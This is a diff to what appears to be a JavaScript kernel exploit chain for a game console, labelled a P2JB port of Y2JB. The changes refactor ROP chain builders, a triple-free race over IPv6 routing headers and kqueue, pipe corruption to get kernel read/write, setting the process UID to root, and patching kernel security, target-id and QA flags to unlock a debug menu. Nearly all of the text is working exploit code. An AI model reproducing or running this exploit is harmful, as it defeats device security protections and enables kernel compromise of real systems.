@@ -1521,9 +1521,9 @@ function spawn_thread(fake_rop_race1_array) {
 }
 
 
-(async function () {
+(function () {
     try {
-        const p2jb_version = "P2JB 1.0 (Y2JB port v2)";
+        const p2jb_version = "P2JB 0.1 (Y2JB v2 -> NFJB port)";
 
         const PAGE_SIZE = 0x4000;
 
@@ -1689,12 +1689,13 @@ function spawn_thread(fake_rop_race1_array) {
 
         const ulog_port = 8089;
         let _log_socket_fd = null;
-        // _log_socket_fd = connectToServer(ulog_port); // uncomment to log to a raw socket instead of a websocket to avoid messages getting truncated randomly when there is a crash
+        _log_socket_fd = connectToServer(ulog_port); // uncomment to log to a raw socket instead of a websocket to avoid messages getting truncated randomly when there is a crash
         let _log_socket_buf = null;
         const _LOG_SOCKET_MAXLEN = 4096;
 
-        async function ulog(msg) {
-            let message = "[p2jb] " + String(msg);
+        function ulog(msg) {
+            const _t = new Date(); const _ts = _t.toTimeString().slice(0,8) + '.' + String(_t.getMilliseconds()).padStart(3,'0');
+            let message = "[p2jb " + _ts + "] " + String(msg);
 
             if (_log_socket_fd !== null && typeof syscall !== 'undefined') {
                 try {
@@ -1718,7 +1719,7 @@ function spawn_thread(fake_rop_race1_array) {
                  }
             } else {
                 logger.log(message);
-                return logger.flush()
+                logger.flush()
             }
         }
 
@@ -1735,29 +1736,38 @@ function spawn_thread(fake_rop_race1_array) {
         }
 
         function spawn_leak_worker(chain_addr) {
+            // Zero a scratch buffer and fill all jmpbuf slots with it so callee-saved
+            // registers (RBX, RBP, R12-R15) have a valid pointer after longjmp, not
+            // uninitialized malloc garbage that would fault on first use.
+            const scratch = malloc(0x100);
+            for (let i = 0; i < 0x100; i += 8) write64_uncompressed(scratch + BigInt(i), 0n);
             const jb = malloc(0x60);
+            for (let i = 0; i < 0x60; i += 8) write64_uncompressed(jb + BigInt(i), scratch);
 
-            write64_uncompressed(jb + 0x00n, g.get('ret'));      // ret addr (RIP)
-            write64_uncompressed(jb + 0x10n, chain_addr);             // RSP - pivot to fake_rop_race1
-            write32_uncompressed(jb + 0x40n, BigInt(saved_fpu_ctrl));   // FPU control word
-            write32_uncompressed(jb + 0x44n, BigInt(saved_mxcsr));      // MXCSR
+            write64_uncompressed(jb + 0x00n, g.get('ret'));
+            write64_uncompressed(jb + 0x10n, chain_addr);
+            write32_uncompressed(jb + 0x40n, BigInt(saved_fpu_ctrl));
+            write32_uncompressed(jb + 0x44n, BigInt(saved_mxcsr));
 
             const stack_size = 0x400n;
             const tls_size = 0x40n;
+            // Zero thr_new_args so flags[0x40] and rtp[0x48] are 0, not garbage that
+            // could set THR_SUSPENDED or cause a kernel dereference of a junk rtp pointer.
             const thr_new_args = malloc(0x80);
+            for (let i = 0; i < 0x80; i += 8) write64_uncompressed(thr_new_args + BigInt(i), 0n);
             const tid_addr = malloc(0x8);
             const cpid = malloc(0x8);
             const stack = malloc(Number(stack_size));
             const tls = malloc(Number(tls_size));
 
-            write64_uncompressed(thr_new_args + 0x00n, longjmp_addr);       // start_func = longjmp
-            write64_uncompressed(thr_new_args + 0x08n, jb);             // arg = jmpbuf
-            write64_uncompressed(thr_new_args + 0x10n, stack);              // stack_base
-            write64_uncompressed(thr_new_args + 0x18n, stack_size);         // stack_size
-            write64_uncompressed(thr_new_args + 0x20n, tls);                // tls_base
-            write64_uncompressed(thr_new_args + 0x28n, tls_size);           // tls_size
-            write64_uncompressed(thr_new_args + 0x30n, tid_addr);           // child_tid (output)
-            write64_uncompressed(thr_new_args + 0x38n, cpid);               // parent_tid (output)
+            write64_uncompressed(thr_new_args + 0x00n, longjmp_addr);
+            write64_uncompressed(thr_new_args + 0x08n, jb);
+            write64_uncompressed(thr_new_args + 0x10n, stack);
+            write64_uncompressed(thr_new_args + 0x18n, stack_size);
+            write64_uncompressed(thr_new_args + 0x20n, tls);
+            write64_uncompressed(thr_new_args + 0x28n, tls_size);
+            write64_uncompressed(thr_new_args + 0x30n, tid_addr);
+            write64_uncompressed(thr_new_args + 0x38n, cpid);
 
             const ret = syscall(SYSCALL.thr_new, thr_new_args, 0x68n);
             if (ret !== 0n) fail("leak worker Thrd_create failed: " + toHex(ret));
@@ -1766,94 +1776,117 @@ function spawn_thread(fake_rop_race1_array) {
         }
 
         function build_leak_worker_chain(core, pipe_rfd, finished_addr, dummybuf, unroll, remainder) {
+            const total_slots = unroll * 31 + remainder * 6 + 0x200;
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
-            const STACK_SIZE = 0x4000 + (unroll * 31 + remainder * 6 + 0x200) * 8;
+            const STACK_SIZE = 0x4000 + total_slots * 8;
+
+            // Allocate the chain buffer and keep the ArrayBuffer reference so we can
+            // write gadgets via a BigUint64Array view, bypassing write64_uncompressed, avoiding gc
             const buf = malloc(STACK_SIZE);
-            for (let k = 0n; k < 0x4000n; k += 8n) write64_uncompressed(buf + k, 0n);
+            const chain_ab = allocated_buffers[allocated_buffers.length - 1];
+            const chain_view = new BigUint64Array(chain_ab);
+
+            // Zero the guard region (first 0x4000 bytes = 0x800 u64 entries).
+            chain_view.fill(0n, 0, 0x800);
+
             const entry = buf + 0x4000n;
+            const ENTRY_START = 0x800; // chain_view index where the ROP chain starts
 
             const mask = malloc(0x10);
             write64_uncompressed(mask + 0x0n, 1n << BigInt(core));
             write64_uncompressed(mask + 0x8n, 0n);
 
+            const rop_ret = g.get('ret');
+            const rop_pop_rax = g.get('pop_rax');
+            const rop_pop_rdi = g.get('pop_rdi');
+            const rop_pop_rsi = g.get('pop_rsi');
+            const rop_pop_rdx = g.get('pop_rdx');
+            const rop_pop_rcx = g.get('pop_rcx');
+            const rop_pop_r8 = g.get('pop_r8');
+            const rop_pop_rsp = g.get('pop_rsp');
+            const rop_mov = g.get('mov_qword_ptr_rdi_rax');
+            const pipe_rfd_n = BigInt(pipe_rfd);
+
             let idx = 0;
-            const emit = (v) => { write64_uncompressed(entry + BigInt(idx * 8), v); idx++; };
+            const emit = (v) => { chain_view[ENTRY_START + idx++] = v; };
+            // at() converts a slot index to its in-memory address.
+            // Only called in repairSlot (~20k times), not in the emit hot path.
             const at = (i) => entry + BigInt(i * 8);
 
-            emit(g.get( 'ret' ));
-            emit(g.get( 'ret' ));
+            emit(rop_ret);
+            emit(rop_ret);
 
-            emit(g.get ( 'pop_rax' )); emit(SYSCALL.cpuset_setaffinity);
-            emit(g.get ( 'pop_rdi' )); emit(3n);
-            emit(g.get ( 'pop_rsi' )); emit(1n);
-            emit(g.get ( 'pop_rdx' )); emit(0xFFFFFFFFFFFFFFFFn);
-            emit(g.get ( 'pop_rcx' )); emit(0x10n);
-            emit(g.get ( 'pop_r8' )); emit(mask);
+            emit(rop_pop_rax); emit(SYSCALL.cpuset_setaffinity);
+            emit(rop_pop_rdi); emit(3n);
+            emit(rop_pop_rsi); emit(1n);
+            emit(rop_pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
+            emit(rop_pop_rcx); emit(0x10n);
+            emit(rop_pop_r8); emit(mask);
             emit(syscall_wrapper);
-            emit(g.get( 'ret' ));
+            emit(rop_ret);
             const LOOP_START = idx;
 
             const readBase = idx;
-            emit(g.get ( 'pop_rax' )); emit(SYSCALL.read);
-            emit(g.get ( 'pop_rdi' )); emit(BigInt(pipe_rfd));
-            emit(g.get ( 'pop_rsi' )); emit(dummybuf);
-            emit(g.get ( 'pop_rdx' )); emit(1n);
+            emit(rop_pop_rax); emit(SYSCALL.read);
+            emit(rop_pop_rdi); emit(pipe_rfd_n);
+            emit(rop_pop_rsi); emit(dummybuf);
+            emit(rop_pop_rdx); emit(1n);
             emit(syscall_wrapper);
-            emit(g.get( 'ret' ));
+            emit(rop_ret);
 
             const kqBase = [];
             for (let k = 0; k < unroll; k++) {
                 kqBase.push(idx);
-                emit(g.get ( 'pop_rax' )); emit(SYSCALL.kqueueex);
-                emit(g.get ( 'pop_rdi' )); emit(POC_ARG);
+                emit(rop_pop_rax); emit(SYSCALL.kqueueex);
+                emit(rop_pop_rdi); emit(POC_ARG);
                 emit(syscall_wrapper);
-                emit(g.get( 'ret' ));
+                emit(rop_ret);
             }
 
             const repairSlot = (slotIdx, value) => {
-                emit(g.get ( 'pop_rdi' )); emit(at(slotIdx));
-                emit(g.get ( 'pop_rax' )); emit(value);
-                emit(g.get( 'mov_qword_ptr_rdi_rax' ));
+                emit(rop_pop_rdi); emit(at(slotIdx));
+                emit(rop_pop_rax); emit(value);
+                emit(rop_mov);
             };
-            repairSlot(readBase + 0, g.get ( 'pop_rax' ));
+            repairSlot(readBase + 0, rop_pop_rax);
             repairSlot(readBase + 1, SYSCALL.read);
-            repairSlot(readBase + 2, g.get ( 'pop_rdi' ));
-            repairSlot(readBase + 3, BigInt(pipe_rfd));
-            repairSlot(readBase + 4, g.get ( 'pop_rsi' ));
+            repairSlot(readBase + 2, rop_pop_rdi);
+            repairSlot(readBase + 3, pipe_rfd_n);
+            repairSlot(readBase + 4, rop_pop_rsi);
             repairSlot(readBase + 5, dummybuf);
-            repairSlot(readBase + 6, g.get ( 'pop_rdx' ));
+            repairSlot(readBase + 6, rop_pop_rdx);
             repairSlot(readBase + 7, 1n);
             repairSlot(readBase + 8, syscall_wrapper);
             for (let k = 0; k < unroll; k++) {
                 const b = kqBase[k];
-                repairSlot(b + 0, g.get ( 'pop_rax' ));
+                repairSlot(b + 0, rop_pop_rax);
                 repairSlot(b + 1, SYSCALL.kqueueex);
-                repairSlot(b + 2, g.get ( 'pop_rdi' ));
+                repairSlot(b + 2, rop_pop_rdi);
                 repairSlot(b + 3, POC_ARG);
                 repairSlot(b + 4, syscall_wrapper);
             }
 
-            emit(g.get ( 'pop_rax' )); emit(1n);
-            emit(g.get ( 'pop_rdi' )); emit(finished_addr);
-            emit(g.get( 'mov_qword_ptr_rdi_rax' ));
+            emit(rop_pop_rax); emit(1n);
+            emit(rop_pop_rdi); emit(finished_addr);
+            emit(rop_mov);
 
-            emit(g.get ( 'pop_rsp' ));
+            emit(rop_pop_rsp);
             const PIVOT = idx; emit(at(LOOP_START));
 
-            if (idx % 2 !== 0) emit(g.get( 'ret' ));
+            if (idx % 2 !== 0) emit(rop_ret);
             const EXIT = idx;
             for (let k = 0; k < remainder; k++) {
-                emit(g.get ( 'pop_rax' )); emit(SYSCALL.kqueueex);
-                emit(g.get ( 'pop_rdi' )); emit(POC_ARG);
+                emit(rop_pop_rax); emit(SYSCALL.kqueueex);
+                emit(rop_pop_rdi); emit(POC_ARG);
                 emit(syscall_wrapper);
-                emit(g.get( 'ret' ));
+                emit(rop_ret);
             }
-            emit(g.get ( 'pop_rax' )); emit(EXIT_MARK);
-            emit(g.get ( 'pop_rdi' )); emit(finished_addr);
-            emit(g.get( 'mov_qword_ptr_rdi_rax' ));
-            emit(g.get ( 'pop_rax' )); emit(SYSCALL.thr_exit);
-            emit(g.get ( 'pop_rdi' )); emit(0n);
+            emit(rop_pop_rax); emit(EXIT_MARK);
+            emit(rop_pop_rdi); emit(finished_addr);
+            emit(rop_mov);
+            emit(rop_pop_rax); emit(SYSCALL.thr_exit);
+            emit(rop_pop_rdi); emit(0n);
             emit(syscall_wrapper);
 
             return { entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
@@ -2198,7 +2231,7 @@ function spawn_thread(fake_rop_race1_array) {
             return Number(read32_uncompressed(S.tag_buf + 4n));
         }
 
-        async function find_twins(S, max_rounds) {
+        function find_twins(S, max_rounds) {
             for (let round_ = 1; round_ <= max_rounds; round_++) {
                 for (let i = 0; i < S.ipv6_count; i++) {
                     write32_uncompressed(S.rthdr_spray + 4n, BigInt(RTHDR_TAG + i));
@@ -2259,7 +2292,7 @@ function spawn_thread(fake_rop_race1_array) {
             return triplets_valid(S);
         }
 
-        async function prepare_fds(S) {
+        function prepare_fds(S) {
             const rl = malloc(16);
             syscall(0xC2n, 8n, rl);
             const nofile_hard = read64_uncompressed(rl + 8n);
@@ -2309,7 +2342,7 @@ function spawn_thread(fake_rop_race1_array) {
 
             syscall(SYSCALL.setuid, 1n);
 
-            await sleep(10000);
+            nanosleep_ms(10000);
 
             const TOTAL_SYSCALLS = 0x100000001n - BigInt(free_fds_num);
 
@@ -2325,6 +2358,7 @@ function spawn_thread(fake_rop_race1_array) {
             const FEED_CHUNK = 4096;
 
             my_init_threading();
+
             const chunkbuf = malloc(FEED_CHUNK);
 
             const base_share = TOTAL_SYSCALLS / BigInt(NW);
@@ -2346,24 +2380,32 @@ function spawn_thread(fake_rop_race1_array) {
                 lws.push({ chain, rfd, wfd, finished, normal: normal_w, queued: 0n });
             }
 
+            const FEED_CHUNK_BIG = BigInt(FEED_CHUNK);
+            for (const lw of lws) {
+                lw.wfd_big = BigInt(lw.wfd);
+                lw.normal_n = Number(lw.normal);
+                lw.queued_n = 0;
+            }
             let all_fed = false;
             while (!all_fed) {
                 all_fed = true;
                 for (const lw of lws) {
-                    if (lw.queued < lw.normal) {
+                    if (lw.queued_n < lw.normal_n) {
                         all_fed = false;
-                        let want = lw.normal - lw.queued;
-                        if (want > BigInt(FEED_CHUNK)) want = BigInt(FEED_CHUNK);
-                        const n = syscall(SYSCALL.write, BigInt(lw.wfd), chunkbuf, want);
-                        if (n > 0n && n <= BigInt(FEED_CHUNK)) lw.queued += n;
+                        const remaining = lw.normal_n - lw.queued_n;
+                        const want = remaining >= FEED_CHUNK ? FEED_CHUNK_BIG : BigInt(remaining);
+                        const n = syscall(SYSCALL.write, lw.wfd_big, chunkbuf, want);
+                        if (n > 0n && n <= FEED_CHUNK_BIG) lw.queued_n += Number(n);
                     }
                 }
-                await sleep(500);
+                nanosleep_ms(500);
             }
+            ulog("after feeding ");
+
             for (const lw of lws) {
                 while (true) {
                     write64_uncompressed(lw.finished, 0n);
-                    await sleep(1500);
+                    nanosleep_ms(1500);
                     if (read64_uncompressed(lw.finished) === 0n) break;
                 }
             }
@@ -2375,7 +2417,7 @@ function spawn_thread(fake_rop_race1_array) {
             for (const lw of lws) {
                 const dl = Date.now() + 15000;
                 while (read64_uncompressed(lw.finished) !== EXIT_MARK && Date.now() < dl)
-                    await sleep(50);
+                    nanosleep_ms(50);
                 syscall(SYSCALL.close, BigInt(lw.rfd));
                 syscall(SYSCALL.close, BigInt(lw.wfd));
             }
@@ -2386,8 +2428,8 @@ function spawn_thread(fake_rop_race1_array) {
                 S.free_fds.push(Number(fd));
             }
             syscall(SYSCALL.setuid, 1n);
-
-            await sleep(10000);
+            nanosleep_ms(10000);
+            ulog("prepare_fds end");
         }
 
         function free_one_fd(S) {
@@ -2408,14 +2450,14 @@ function spawn_thread(fake_rop_race1_array) {
             }
         }
 
-        async function attempt_race(S) {
+        function attempt_race(S) {
 
             for (let i = 0; i < S.ipv6_count; i++) rthdr_free_idx(S, i);
             free_one_fd(S);
             flush_iov_workers(S, 32);
             free_one_fd(S);
 
-            const twins = await find_twins(S, MAX_ROUNDS_TWIN);
+            const twins = find_twins(S, MAX_ROUNDS_TWIN);
             if (!twins) return false;
 
             rthdr_free_idx(S, twins[1]);
@@ -2457,15 +2499,15 @@ function spawn_thread(fake_rop_race1_array) {
             return true;
         }
 
-        async function stage0(S) {
-            send_notification("Stage 0\nTriple-free race");
+        function stage0(S) {
+            ulog("Stage 0\nTriple-free race");
 
             if (failcheck_path) {
                 try { write_file(failcheck_path, ""); } catch (_) { }
             }
             for (let attempt = 1; attempt <= TRIPLEFREE_ATTEMPTS; attempt++) {
-                if (await attempt_race(S)) {
-                    await ulog("stage0: triplets " + S.triplets.join(",") +
+                if (attempt_race(S)) {
+                    ulog("stage0: triplets " + S.triplets.join(",") +
                         " (attempt " + attempt + "/" + TRIPLEFREE_ATTEMPTS +
                         ")");
                     nanosleep_ms(500);
@@ -2685,7 +2727,7 @@ function spawn_thread(fake_rop_race1_array) {
             return null;
         }
 
-        async function stage1(S) {
+        function stage1(S) {
             send_notification("Stage 1\nKqueue reclaim");
             rthdr_free_idx(S, S.triplets[1]);
             sched_yield_n(2);
@@ -2719,7 +2761,7 @@ function spawn_thread(fake_rop_race1_array) {
             }
             if ((proc_filedesc >> 48n) !== 0xFFFFn) fail("stage1: bad filedesc: " + toHex(proc_filedesc));
             S.proc_filedesc = proc_filedesc;
-            await ulog("stage1: proc_filedesc=" + toHex(proc_filedesc));
+            ulog("stage1: proc_filedesc=" + toHex(proc_filedesc));
 
             for (let k = 0; k < 3; k++) {
                 S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], 50000);
@@ -2729,9 +2771,9 @@ function spawn_thread(fake_rop_race1_array) {
             if (S.triplets[1] === -1) fail("stage1: triplet repair failed");
         }
 
-        async function stage2(S) {
+        function stage2(S) {
             send_notification("Stage 2\nLeak pipe data pointers");
-            await ulog("stage2: leaking pipe pointers...");
+            ulog("stage2: leaking pipe pointers...");
             for (let attempt = 0; attempt < 5; attempt++) {
                 repair_triplets(S); nanosleep_ms(100);
                 const fdescenttbl = kslow64(S, S.proc_filedesc + S.OFF.FILEDESC_OFILES);
@@ -2755,7 +2797,7 @@ function spawn_thread(fake_rop_race1_array) {
                 if (!S.victim_pipe_data) continue;
 
                 if (S.master_pipe_data !== S.victim_pipe_data) {
-                    await ulog("stage2: master_pipe=" + toHex(S.master_pipe_data) +
+                    ulog("stage2: master_pipe=" + toHex(S.master_pipe_data) +
                         " victim_pipe=" + toHex(S.victim_pipe_data));
                     return;
                 }
@@ -2764,9 +2806,9 @@ function spawn_thread(fake_rop_race1_array) {
             fail("stage2: failed to leak pipe pointers");
         }
 
-        async function stage3(S) {
+        function stage3(S) {
             send_notification("Stage 3\nPipe corruption -> fast kernel R/W");
-            await ulog("stage3: corrupting pipe buffer...");
+            ulog("stage3: corrupting pipe buffer...");
 
             const pipe_overwrite = malloc(24);
             write32_uncompressed(pipe_overwrite, 0n);
@@ -2819,12 +2861,12 @@ function spawn_thread(fake_rop_race1_array) {
                 kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24);
             }
             if (!verified) fail("stage3: verify failed");
-            await ulog("stage3: kernel r/w achieved");
+            ulog("stage3: kernel r/w achieved");
 
-            await stage3_cleanup(S);
+            stage3_cleanup(S);
         }
 
-        async function stage3_cleanup(S) {
+        function stage3_cleanup(S) {
             const get_fp = fd => S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
             const bump = (fp, delta) => {
                 const rc = S.kread32(fp + 0x28n);
@@ -2870,29 +2912,29 @@ function spawn_thread(fake_rop_race1_array) {
             write16_uncompressed(S.rt_params + 2n, 0n);
             syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, S.rt_params);
 
-            await ulog("stage3b: race cleanup done");
+            ulog("stage3b: race cleanup done");
 
-            await sleep(3000);
+            nanosleep_ms(3000);
         }
 
-        async function force_td_ucred_migrate(S) {
+        function force_td_ucred_migrate(S) {
 
             try {
                 const B = S.proc_ucred;
                 if (B === 0n || (B >> 48n) !== 0xFFFFn) {
-                    await ulog("stage_d6: proc_ucred invalid, skip");
+                    ulog("stage_d6: proc_ucred invalid, skip");
                     return;
                 }
 
                 const main_thread = S.kread64(S.curproc + 0x10n);
                 if (main_thread === 0n || (main_thread >> 48n) !== 0xFFFFn) {
-                    await ulog("stage_d6: p_threads empty, skip");
+                    ulog("stage_d6: p_threads empty, skip");
                     return;
                 }
 
                 const bp = S.kread64(main_thread + 0x08n);
                 if (bp !== S.curproc) {
-                    await ulog("stage_d6: td_proc backptr mismatch (" + toHex(bp) +
+                    ulog("stage_d6: td_proc backptr mismatch (" + toHex(bp) +
                         " vs " + toHex(S.curproc) + "), skip");
                     return;
                 }
@@ -2900,7 +2942,7 @@ function spawn_thread(fake_rop_race1_array) {
                 const next_thread = S.kread64(main_thread + 0x10n);
                 if (next_thread === 0n || (next_thread >> 48n) !== 0xFFFFn ||
                     next_thread === main_thread) {
-                    await ulog("stage_d6: no 2nd thread for cross-validation, skip");
+                    ulog("stage_d6: no 2nd thread for cross-validation, skip");
                     return;
                 }
                 const candidates = [];
@@ -2913,16 +2955,16 @@ function spawn_thread(fake_rop_race1_array) {
                     candidates.push(off);
                 }
                 if (candidates.length === 0) {
-                    await ulog("stage_d6: td_ucred offset not found, skip");
+                    ulog("stage_d6: td_ucred offset not found, skip");
                     return;
                 }
                 if (candidates.length > 1) {
-                    await ulog("stage_d6: td_ucred offset ambiguous (" +
+                    ulog("stage_d6: td_ucred offset ambiguous (" +
                         candidates.length + " candidates), skip");
                     return;
                 }
                 const td_ucred_off = candidates[0];
-                await ulog("stage_d6: td_ucred at +" + toHex(td_ucred_off) +
+                ulog("stage_d6: td_ucred at +" + toHex(td_ucred_off) +
                     " (1 cand, validated)");
 
                 let td = main_thread;
@@ -2932,7 +2974,7 @@ function spawn_thread(fake_rop_race1_array) {
                     walked++;
 
                     if (S.kread64(td + 0x08n) !== S.curproc) {
-                        await ulog("stage_d6: td_proc mismatch at thread " +
+                        ulog("stage_d6: td_proc mismatch at thread " +
                             toHex(td) + ", abort walk");
                         break;
                     }
@@ -2943,7 +2985,7 @@ function spawn_thread(fake_rop_race1_array) {
                     }
                     td = S.kread64(td + 0x10n);
                 }
-                await ulog("stage_d6: walked " + walked + " threads, patched " +
+                ulog("stage_d6: walked " + walked + " threads, patched " +
                     patched + " stale td_ucred");
 
                 if (patched > 0) {
@@ -2951,16 +2993,16 @@ function spawn_thread(fake_rop_race1_array) {
                     const old_ref = S.kread32(B);
                     const new_ref = old_ref + BigInt(patched);
                     S.kwrite32(B, new_ref);
-                    await ulog("stage_d6: cr_ref(B) " + toHex(old_ref) +
+                    ulog("stage_d6: cr_ref(B) " + toHex(old_ref) +
                         " -> " + toHex(new_ref) + " (+" + patched + ")");
                 }
             } catch (e) {
-                try { await ulog("stage_d6: exception: " + e.message + " - skipped"); }
+                try { ulog("stage_d6: exception: " + e.message + " - skipped"); }
                 catch (_) { }
             }
         }
 
-        async function stage4(S) {
+        function stage4(S) {
             send_notification("Stage 4\nFind curproc + rootvnode");
 
             const [sr, sw] = create_pipe();
@@ -2986,9 +3028,9 @@ function spawn_thread(fake_rop_race1_array) {
             S.curproc = curproc;
             S.proc_ucred = S.kread64(curproc + S.OFF.PROC_UCRED);
             S.proc_fd = S.kread64(curproc + S.OFF.PROC_FD);
-            await ulog("stage4: curproc=" + toHex(curproc) + " fd=" + toHex(S.proc_fd));
+            ulog("stage4: curproc=" + toHex(curproc) + " fd=" + toHex(S.proc_fd));
 
-            await force_td_ucred_migrate(S);
+            force_td_ucred_migrate(S);
 
             const walk = (start, link_off) => {
                 let p = start;
@@ -3011,10 +3053,10 @@ function spawn_thread(fake_rop_race1_array) {
                 fail("stage4: rootvnode not found");
             }
             S.rootvnode = rootvnode;
-            await ulog("stage4: rootvnode=" + toHex(rootvnode));
+            ulog("stage4: rootvnode=" + toHex(rootvnode));
         }
 
-        async function stage5(S) {
+        function stage5(S) {
             send_notification("Stage 5\nJailbreak");
 
             S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_UID, 0);
@@ -3033,10 +3075,10 @@ function spawn_thread(fake_rop_race1_array) {
             if (S.kread32(S.proc_ucred + S.OFF.UCRED_CR_UID) !== 0n) {
                 fail("stage5: jailbreak verify failed");
             }
-            await ulog("stage5: jailbreak ok");
+            ulog("stage5: jailbreak ok");
         }
 
-        async function stage6(S) {
+        function stage6(S) {
             send_notification("Stage 6\nData_base + Debug menu");
 
             const KDATA_MASK = 0xffff804000000000n;
@@ -3050,25 +3092,25 @@ function spawn_thread(fake_rop_race1_array) {
             }
             if (allproc === 0n) {
                 S.data_base_ok = false;
-                await ulog("stage6: allproc not found - debug menu + elf " +
+                ulog("stage6: allproc not found - debug menu + elf " +
                     "loader skipped (jailbreak is done)");
                 return;
             }
             const data_base = allproc - S.OFF.DATA_BASE_ALLPROC;
             S.data_base = data_base;
-            await ulog("stage6: allproc=" + toHex(allproc) +
+            ulog("stage6: allproc=" + toHex(allproc) +
                 " data_base=" + toHex(data_base));
 
             let data_base_ok = true;
             const first_proc = S.kread64(allproc);
             const first_proc_ok = (first_proc >> 48n) === 0xFFFFn;
-            await ulog("stage6: data_base check - *allproc=" + toHex(first_proc) +
+            ulog("stage6: data_base check - *allproc=" + toHex(first_proc) +
                 (first_proc_ok ? "  (kptr OK)" : "  (BAD - not a kptr)"));
             if (!first_proc_ok) data_base_ok = false;
             if (S.OFF.DATA_BASE_ROOTVNODE) {
                 const rv_off = S.kread64(data_base + S.OFF.DATA_BASE_ROOTVNODE);
                 const rv_ok = (rv_off === S.rootvnode);
-                await ulog("stage6: data_base check - rootvnode via offset=" +
+                ulog("stage6: data_base check - rootvnode via offset=" +
                     toHex(rv_off) + " vs stage4 found=" + toHex(S.rootvnode) +
                     (rv_ok ? "  => data_base CORRECT"
                         : "  => MISMATCH - data_base / 11.60 offsets are WRONG"));
@@ -3076,31 +3118,31 @@ function spawn_thread(fake_rop_race1_array) {
             }
 
             if (typeof is_jailbroken === "function")
-                await ulog("stage6: is_jailbroken() = " + is_jailbroken());
+                ulog("stage6: is_jailbroken() = " + is_jailbroken());
             S.data_base_ok = data_base_ok;
             if (!data_base_ok) {
-                await ulog("stage6: data_base check FAILED - skipping the debug " +
+                ulog("stage6: data_base check FAILED - skipping the debug " +
                     "menu and the elf loader. The jailbreak is complete.");
                 return;
             }
 
             if (ENABLE_DEBUG_MENU) {
-                await stage_debug_menu(S);
+                stage_debug_menu(S);
             } else {
-                await ulog("stage6: debug menu DISABLED (ENABLE_DEBUG_MENU=false)");
+                ulog("stage6: debug menu DISABLED (ENABLE_DEBUG_MENU=false)");
             }
         }
 
-        async function stage_debug_menu(S) {
+        function stage_debug_menu(S) {
             try {
                 if (typeof gpu === "undefined" || typeof kernel === "undefined" ||
                     typeof update_kernel_offsets !== "function") {
-                    await ulog("stage_debug: framework gpu/kernel/update_kernel_offsets " +
+                    ulog("stage_debug: framework gpu/kernel/update_kernel_offsets " +
                         "not in scope - skipped");
                     return;
                 }
                 if (!S.data_base || !S.curproc) {
-                    await ulog("stage_debug: data_base/curproc missing - skipped");
+                    ulog("stage_debug: data_base/curproc missing - skipped");
                     return;
                 }
 
@@ -3120,7 +3162,7 @@ function spawn_thread(fake_rop_race1_array) {
                 const cr3 = S.kread64(pmap_store + S.OFF.PMAP_CR3);
                 kernel.addr.kernel_cr3 = cr3;
                 kernel.addr.dmap_base = pml4 - cr3;
-                await ulog("stage_debug: cr3=" + toHex(cr3) +
+                ulog("stage_debug: cr3=" + toHex(cr3) +
                     " dmap_base=" + toHex(kernel.addr.dmap_base));
 
                 if (kernel_offset.SIZEOF_GVMSPACE === undefined) kernel_offset.SIZEOF_GVMSPACE = 0x100n;
@@ -3129,75 +3171,75 @@ function spawn_thread(fake_rop_race1_array) {
                 if (kernel_offset.GVMSPACE_PAGE_DIR_VA === undefined) kernel_offset.GVMSPACE_PAGE_DIR_VA = 0x38n;
 
                 update_kernel_offsets();
-                await ulog("stage_debug: VMSPACE_VM_PMAP=" +
+                ulog("stage_debug: VMSPACE_VM_PMAP=" +
                     toHex(kernel_offset.VMSPACE_VM_PMAP) + " VM_VMID=" +
                     toHex(kernel_offset.VMSPACE_VM_VMID));
 
-                await gpu.setup();
-                await ulog("stage_debug: gpu.setup() ok");
+                gpu.setup();
+                ulog("stage_debug: gpu.setup() ok");
 
                 const security_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_SECURITY_FLAGS;
                 const target_id_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_TARGET_ID;
                 const qa_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_QA_FLAGS;
                 const utoken_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_UTOKEN_FLAGS;
 
-                await ulog("stage_debug: setting security flags");
-                const security_flags = await kernel.read_dword(security_flags_addr);
-                await ulog("  before: " + toHex(security_flags));
-                await gpu.write_dword(security_flags_addr, security_flags | 0x14n);
-                const security_flags_after = await kernel.read_dword(security_flags_addr);
-                await ulog("  after:  " + toHex(security_flags_after));
+                ulog("stage_debug: setting security flags");
+                const security_flags = kernel.read_dword(security_flags_addr);
+                ulog("  before: " + toHex(security_flags));
+                gpu.write_dword(security_flags_addr, security_flags | 0x14n);
+                const security_flags_after = kernel.read_dword(security_flags_addr);
+                ulog("  after:  " + toHex(security_flags_after));
 
-                await ulog("stage_debug: setting targetid");
-                const target_id_before = await kernel.read_byte(target_id_flags_addr);
-                await ulog("  before: " + toHex(target_id_before));
-                await gpu.write_byte(target_id_flags_addr, 0x82n);
-                const target_id_after = await kernel.read_byte(target_id_flags_addr);
-                await ulog("  after:  " + toHex(target_id_after));
+                ulog("stage_debug: setting targetid");
+                const target_id_before = kernel.read_byte(target_id_flags_addr);
+                ulog("  before: " + toHex(target_id_before));
+                gpu.write_byte(target_id_flags_addr, 0x82n);
+                const target_id_after = kernel.read_byte(target_id_flags_addr);
+                ulog("  after:  " + toHex(target_id_after));
 
-                await ulog("stage_debug: setting qa flags and utoken flags");
-                const qa_flags = await kernel.read_dword(qa_flags_addr);
-                await ulog("  qa_flags before: " + toHex(qa_flags));
-                await gpu.write_dword(qa_flags_addr, qa_flags | 0x10300n);
-                const qa_flags_after = await kernel.read_dword(qa_flags_addr);
-                await ulog("  qa_flags after:  " + toHex(qa_flags_after));
+                ulog("stage_debug: setting qa flags and utoken flags");
+                const qa_flags = kernel.read_dword(qa_flags_addr);
+                ulog("  qa_flags before: " + toHex(qa_flags));
+                gpu.write_dword(qa_flags_addr, qa_flags | 0x10300n);
+                const qa_flags_after = kernel.read_dword(qa_flags_addr);
+                ulog("  qa_flags after:  " + toHex(qa_flags_after));
 
-                const utoken_flags = await kernel.read_byte(utoken_flags_addr);
-                await ulog("  utoken_flags before: " + toHex(utoken_flags));
